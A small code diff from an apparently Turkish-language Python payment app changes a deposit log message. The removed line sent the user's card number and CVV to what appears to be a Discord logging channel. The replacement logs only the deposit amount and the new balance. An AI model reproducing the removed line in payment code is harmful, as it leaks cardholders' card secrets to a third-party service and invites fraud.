@@ -1189,7 +1189,7 @@ def deposit():
 
         send_discord_log(
             title="💳 Bakiye Yüklendi",
-            description=f"**Kullanıcı:** `{user['username']}`\n**Banka:** `{bank_name}`\n**cardnumber:** {card_number}`\n**cvv:** {cvv} ",
+            description=f"**Kullanıcı:** `{user['username']}`\n**Banka:** `{bank_name}`\n**Yüklenen:** {amount_val:.2f} TL\n**Güncel Bakiye:** {new_balance:.2f} TL",
             color=3066993
         )
 
